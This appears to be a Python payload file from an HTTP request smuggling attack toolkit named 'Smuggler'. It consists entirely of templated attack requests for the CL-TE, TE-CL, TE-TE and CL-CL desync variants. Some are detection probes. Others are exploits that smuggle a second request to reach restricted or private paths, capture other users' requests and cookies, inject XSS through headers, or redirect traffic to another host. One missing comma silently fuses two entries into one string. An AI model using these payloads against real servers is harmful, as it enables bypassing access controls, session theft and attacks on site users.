#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
payloads={
	'CL-CL-0#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nContent-Length: 7\n\n3\nabc\nQ',
	'CL-CL-1#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nContent-Length: 7\n\n0\n\nX',
	'TE-TE-0#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n3\nabc\nQ',
	'TE-TE-1#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nX',
	'TE-CL-0#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\n\n3\nabc\nQ',
	'TE-CL-1#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\n\nX\n\n0\n\nX',
	'CL-TE-0#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\n\n3\nabc\nQ',
	'CL-TE-1#Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\n\n0\n\nX'
	 }

exploits={
	'EXPLOIT-0#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1\r\nContent-Length: $CL\n\np=$files',
	'EXPLOIT-1_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nGET $restricted_path HTTP/1.1\r\nHost: $target\r\nFoo: x',
	'EXPLOIT-1_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nGET $restricted_path HTTP/1.1\r\nHost: $target\r\nFoo: x',
	'EXPLOIT-1_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nGET $restricted_path HTTP/1.1\r\nHost: $target\r\nFoo: x',
	'EXPLOIT-1_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nGET $restricted_path HTTP/1.1\r\nHost: $target\r\nFoo: x',
	'EXPLOIT-2_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\n\n$parameter=',
	'EXPLOIT-2_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\n\n$parameter=',
	'EXPLOIT-2_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\n\n$parameter=',
	'EXPLOIT-2_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\n\n$parameter='
	'EXPLOIT-3_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\nCookie: $cookie\n\n$parameters',
	'EXPLOIT-3_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\nCookie: $cookie\n\n$parameters',
	'EXPLOIT-3_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\nCookie: $cookie\n\n$parameters',
	'EXPLOIT-3_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nPOST $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\nCookie: $cookie\n\n$parameters',
	'EXPLOIT-4_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\n$method $path HTTP/1.1\r\n$header: $xss\r\nFoo: X',
	'EXPLOIT-4_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\n$method $path HTTP/1.1\r\n$header: $xss\r\nFoo: X',
	'EXPLOIT-4_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\n$method $path HTTP/1.1\r\n$header: $xss\r\nFoo: X',
	'EXPLOIT-4_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\n$method $path HTTP/1.1\r\n$header: $xss\r\nFoo: X',
	'EXPLOIT-5_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-5_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-5_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-5_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-6_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-6_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-6_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-6_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nGET $path HTTP/1.1\r\nHost: $location\r\nFoo: X',
	'EXPLOIT-7_CL-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\n\n0\n\nGET $private HTTP/1.1\r\nFoo: X',
	'EXPLOIT-7_TE-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\n\n0\n\nGET $private HTTP/1.1\r\nFoo: X',
	'EXPLOIT-7_TE-TE#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\n\n0\n\nGET $private HTTP/1.1\r\nFoo: X',
	'EXPLOIT-7_CL-CL#$method $path HTTP/1.1\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: 7\n\n0\n\nGET $private HTTP/1.1\r\nFoo: X',
         }
